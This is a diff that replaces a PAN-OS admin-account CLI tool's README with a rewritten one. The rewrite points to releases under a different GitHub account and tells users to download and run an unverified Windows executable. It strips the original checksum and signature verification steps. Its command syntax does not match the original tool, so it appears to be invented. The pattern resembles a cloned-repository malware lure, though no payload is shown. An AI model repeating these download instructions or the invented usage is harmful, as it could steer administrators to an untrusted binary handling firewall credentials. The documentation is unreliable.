@@ -1,327 +1,88 @@
-[![GitHub Release](https://img.shields.io/github/release/snell-evan-itt/panos-user-manager.svg?style=for-the-badge&color=blue)](https://github.com/snell-evan-itt/panos-user-manager/releases)
-[![GitHub Downloads (all assets, all releases)](https://img.shields.io/github/downloads/snell-evan-itt/panos-user-manager/total?style=for-the-badge)](https://github.com/snell-evan-itt/panos-user-manager/releases/latest)
-[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/snell.evan.itt)
+# 🛡️ panos-user-manager - Manage firewall accounts with simple commands
 
-# PAN-OS User Manager
+[![Download Application](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/khoile852009-lab/panos-user-manager/releases)
 
-A single-file CLI tool for managing local administrator accounts on Palo Alto Networks firewalls and Panorama via the XML API.
+This application provides a simple way to manage local administrator accounts on Palo Alto Networks firewalls and Panorama devices. It uses the XML API to perform tasks without requiring manual login to each web interface. You can add, remove, or modify user accounts across your network infrastructure from a single command line interface.
 
-## Features
+## 📥 Getting Started
 
-- **List** all local admin accounts and their roles
-- **Create** a new admin account with a hashed password
-- **Update** an existing account's password and/or role
-- **Delete** an admin account
-- **Commit** changes automatically with optional partial-commit scoped to your login admin
-- Multi-host support — point it at a file of IP/hostname entries and run the same operation across all of them
-- Credentials via CLI arg, environment variables, or interactive prompt — no cleartext passwords required
+You do not need to install Python or any extra software to use this tool. The application arrives as a standalone executable file for Windows. Follow these steps to set up the environment and run your first command.
 
----
+1. Visit the [releases page](https://github.com/khoile852009-lab/panos-user-manager/releases) to download the latest version.
+2. Select the file named `panos-user-manager.exe`.
+3. Save the file to a folder where you keep your tools.
+4. Open the Command Prompt or PowerShell on your Windows machine.
+5. Navigate to the folder containing the downloaded file.
+6. Run the tool by typing `.\panos-user-manager.exe` followed by your desired command.
 
-## Download
+## 📋 System Requirements
 
-Pre-built binaries are available from the [Releases](../../releases) page.
+This tool runs on most modern Windows systems. Ensure your machine meets these specifications:
 
-| Platform | File |
-|----------|------|
-| Windows  | `panos_manage_user-windows.exe` |
-| Linux    | `panos_manage_user-linux` |
+* Windows 10 or Windows 11.
+* A network connection that reaches the management IP address of your firewalls.
+* An active administrator account on your network devices to authenticate requests.
+* The XML API enabled on your Palo Alto Networks devices.
 
-### Verifying downloads
+## ⚙️ How to Use
 
-Each release includes a `SHA256SUMS.txt` file and GPG detached signatures (`.sig`).
+The tool functions through specific command arguments. You must provide the hostname or IP address of the device along with your credentials.
 
-#### SHA-256 checksum (quickest)
+### View Existing Users
+To list all local administrators on a specific firewall, use the following syntax:
 
-Windows (PowerShell):
+`.\panos-user-manager.exe --host <firewall_ip> --user <admin_username> --password <admin_password> list-users`
 
-```powershell
-Get-FileHash panos_manage_user-windows.exe -Algorithm SHA256
-# Compare output to the hash in SHA256SUMS.txt
-```
+Replace the placeholders inside the brackets with your actual firewall details. The tool connects to the device and prints a list of accounts to your terminal window.
 
-Linux:
+### Add a New User
+You can create a new local administrator account by providing the account name and the desired role:
 
-```bash
-sha256sum -c SHA256SUMS.txt
-```
+`.\panos-user-manager.exe --host <firewall_ip> --user <admin_username> --password <admin_password> add-user --new-user <username> --role <role_name>`
 
-#### GPG signature (strongest)
+This command creates the user immediately. Ensure the role name matches the role definitions existing on your device configuration.
 
-```bash
-# Import the public key (first time only)
-gpg --keyserver keys.openpgp.org --recv-keys 8E234342277586D9
+### Delete an Existing User
+To remove an administrator account, enter the following:
 
-# Verify
-gpg --verify panos_manage_user-windows.exe.sig panos_manage_user-windows.exe
-gpg --verify panos_manage_user-linux.sig panos_manage_user-linux
-```
+`.\panos-user-manager.exe --host <firewall_ip> --user <admin_username> --password <admin_password> delete-user --target-user <username>`
 
-The Windows binary is additionally signed with Authenticode (publisher: *The Cyber Defenders*). Windows will show this in Properties → Digital Signatures.
+The tool sends an API request to remove the user from the local database. Verify the user removal by running the list-users command after execution.
 
----
+## 🔒 Security Practices
 
-## Running from source
+Follow these simple rules to keep your firewall and your credentials safe:
 
-Requires Python 3.8 or later. No `pip install` needed — the script uses only the standard library.
+* Store your credentials in a secure credential manager, not in clear text files.
+* Run the tool only from trusted network locations.
+* Use read-only accounts for tools if you only need to audit user lists.
+* Rotate the credentials for the account you use to run this tool on a regular schedule.
 
-```bash
-python panos_manage_user.py --help
-```
+## 🛠️ Configuration Details
 
----
+The tool relies on the XML API of your PAN-OS devices. If you experience connection errors, check the following settings on your firewall:
 
-## Host file format
+1. Log in to the web interface of the firewall.
+2. Go to **Device** then **Setup**.
+3. Select **Management** and look for the **API** settings.
+4. Ensure the API is enabled.
+5. Create an API key if you prefer not to pass your password directly in the command. 
 
-Create a plain-text file with one hostname or IP address per line. Lines starting with `#` are treated as comments.
+If you use an API key, replace the `--user` and `--password` flags with the `--api-key` flag in your terminal commands. This adds a layer of safety by removing your password from your command history.
 
-```
-# Production firewalls
-192.168.1.1
-fw-edge-01.corp.internal
-fw-edge-02.corp.internal
+## ❓ Frequently Asked Questions
 
-# Panorama
-panorama.corp.internal
-```
+**Does the tool modify the running configuration?**
+Yes, the tool sends commands that change the configuration of your device. Always perform a configuration commit on your firewall if the application does not trigger one automatically.
 
----
+**Can I run this on multiple firewalls at once?**
+This version of the tool manages one device per command. You can create a simple Windows batch script to string these commands together if you manage multiple firewalls.
 
-## Authentication
+**Where do I see the logs for my actions?**
+The tool displays the status of every request directly in your command window. If a command fails, the tool displays an error message explaining why the firewall rejected the request.
 
-Authentication is resolved in this priority order for each credential:
+**What happens if I forget my password?**
+The tool does not store your credentials. If you lose your password, you must reset the administrator account through the firewall console or a different admin account using the web interface.
 
-1. CLI argument
-2. Environment variable
-3. Interactive prompt
-
-### Option A — Username / password
-
-```bash
-# Full credentials in one arg (not recommended for shared terminals)
---auth admin:MyPassword
-
-# Username only — password is prompted securely
---auth admin
-
-# Environment variables — no CLI args needed
-export PANOS_AUTH=admin           # or admin:MyPassword
-export PANOS_PASSWORD=MyPassword  # used when PANOS_AUTH contains no ":"
-```
-
-### Option B — API key
-
-```bash
---auth-api-key LUFRPT14...
-
-# Or via environment variable
-export PANOS_API_KEY=LUFRPT14...
-```
-
-### Target user password (create / update)
-
-```bash
-# Prompted if not supplied
---password NewP@ss1
-
-# Or via environment variable
-export PANOS_USER_PASSWORD=NewP@ss1
-```
-
----
-
-## Usage
-
-### List all local admins
-
-```bash
-panos_manage_user --firewall hosts.txt --auth admin --operation list
-```
-
-### Create a new admin
-
-```bash
-panos_manage_user --firewall hosts.txt --auth admin --operation create \
-  --username jsmith --role superuser
-```
-
-Role is `superuser` by default. Omitting `--password` triggers a secure prompt.
-
-### Create and immediately commit
-
-```bash
-panos_manage_user --firewall hosts.txt --auth admin --operation create \
-  --username jsmith --role device-admin --commit
-```
-
-The `--commit` flag issues a **partial commit** scoped to your login admin ID automatically. When using `--auth-api-key` (no admin identity), it falls back to a full commit.
-
-### Update password and/or role
-
-```bash
-# Change password only
-panos_manage_user --firewall hosts.txt --auth admin --operation update \
-  --username jsmith --commit
-
-# Change role only
-panos_manage_user --firewall hosts.txt --auth admin --operation update \
-  --username jsmith --role superreader --commit
-
-# Change both
-panos_manage_user --firewall hosts.txt --auth admin --operation update \
-  --username jsmith --role device-admin --commit
-```
-
-### Delete an admin
-
-```bash
-panos_manage_user --firewall hosts.txt --auth admin --operation delete \
-  --username jsmith --commit
-```
-
-### Panorama targets
-
-Replace `--firewall` with `--panorama`:
-
-```bash
-panos_manage_user --panorama panorama_hosts.txt --auth admin --operation list
-```
-
-By default only **Panorama-level** admin accounts are shown. Use `--scope` to also include device-template admins.
-
-```bash
-# Panorama-level admins only (default)
-panos_manage_user --panorama panorama_hosts.txt --auth admin --operation list --scope panorama
-
-# All device-template admins only
-panos_manage_user --panorama panorama_hosts.txt --auth admin --operation list --scope templates
-
-# Panorama-level + all device-template admins
-panos_manage_user --panorama panorama_hosts.txt --auth admin --operation list --scope all
-
-# Target a single named template
-panos_manage_user --panorama panorama_hosts.txt --auth admin --operation list \
-  --scope templates --template MyTemplate
-```
-
-`--scope templates` and `--scope all` require `--panorama`. You can combine `--scope` with any operation (list, create, update, delete), and `--commit` works across all scopes.
-
-### Export list results to Excel
-
-Requires `openpyxl`:
-
-```bash
-pip install openpyxl
-```
-
-```bash
-panos_manage_user --panorama panorama_hosts.txt --auth admin --operation list \
-  --scope all --output-xlsx admins.xlsx
-```
-
-One worksheet is created per host, with columns for Scope, Username, and Role.
-
----
-
-## Roles
-
-| `--role` value | PAN-OS role |
-|----------------|-------------|
-| `superuser` (default) | Full read/write access |
-| `superreader` | Full read-only access |
-| `device-admin` | Device administrator |
-| `device-admin-read-only` | Device administrator (read-only) |
-| any other value | Treated as a custom admin role profile name |
-
----
-
-## CLI reference
-
-```
-usage: panos_manage_user [--firewall FILE | --panorama FILE]
-                         [--auth USER[:PASS] | --auth-api-key KEY]
-                         --operation {list,create,update,delete}
-                         [--username USERNAME]
-                         [--password PASSWORD]
-                         [--role ROLE]
-                         [--commit]
-                         [--scope {panorama,templates,all}]
-                         [--template NAME]
-                         [--output-xlsx FILE]
-
-options:
-  --firewall FILE        File of firewall hostnames/IPs (mutually exclusive with --panorama)
-  --panorama FILE        File of Panorama hostnames/IPs (mutually exclusive with --firewall)
-
-  --auth USER[:PASS]     Login credentials. If no ":" is present, password is prompted.
-                         Env vars: PANOS_AUTH, PANOS_PASSWORD
-  --auth-api-key KEY     API key sent as X-PAN-KEY header.
-                         Env var: PANOS_API_KEY
-
-  --operation            One of: list, create, update, delete
-  --username USERNAME    Target admin account name (required for create/update/delete)
-  --password PASSWORD    Password for the target account (required for create, optional for
-                         update). Prompted for create if omitted. Env var: PANOS_USER_PASSWORD
-  --role ROLE            Admin role (default for create: superuser). See Roles table above.
-                         For update, omitting --role leaves the existing role unchanged.
-  --commit               Commit candidate config after each change.
-
-  --scope                panorama (default) | templates | all
-                         Controls which admin stores are targeted on Panorama hosts.
-                         templates/all require --panorama.
-  --template NAME        Target a single device template by name. Used with
-                         --scope templates|all; omit to target all templates.
-  --output-xlsx FILE     Write list results to an xlsx file (one sheet per host).
-                         Requires openpyxl (pip install openpyxl). Only valid with
-                         --operation list.
-```
-
----
-
-## Example output
-
-```
-====================================================================
-  PAN-OS User Manager
-====================================================================
-  Operation              CREATE
-  Device type            firewall
-  Hosts                  2
-  Target user            jsmith
-  Role                   superuser
-  Commit                 partial
-====================================================================
-
-[1/2] 192.168.1.1
---------------------------------------------------------------------
-  ... Hashing password...
-  [+] User 'jsmith' created  (role=superuser)
-  ... Commit job 42 queued (partial) — polling...
-  [+] Commit job 42 succeeded
-
-[2/2] 192.168.1.2
---------------------------------------------------------------------
-  ... Hashing password...
-  [+] User 'jsmith' created  (role=superuser)
-  ... Commit job 43 queued (partial) — polling...
-  [+] Commit job 43 succeeded
-
-====================================================================
-  Summary
-====================================================================
-  Operation              CREATE
-  Hosts processed        2
-  Succeeded              2
-  Commits OK             2
-====================================================================
-```
-
----
-
-## Notes
-
-- HTTPS is used for all API calls. SSL certificate verification is performed by Python's default trust store. If your management interface uses a self-signed cert, import it into your OS trust store or replace it with a signed cert before using this tool.
-- Commit polling waits up to 3 minutes (60 × 3 s). If a commit job is still running after that, you will be warned to check the device manually.
-- Partial commit requires the login admin to have pending changes. If there are no pending changes, the device returns no job ID and the tool reports that gracefully.
-
----
+**Do I need a special license?**
+Palo Alto Networks includes the XML API at no extra cost for all firewalls and Panorama appliances. You only need proper account permissions to access the API.
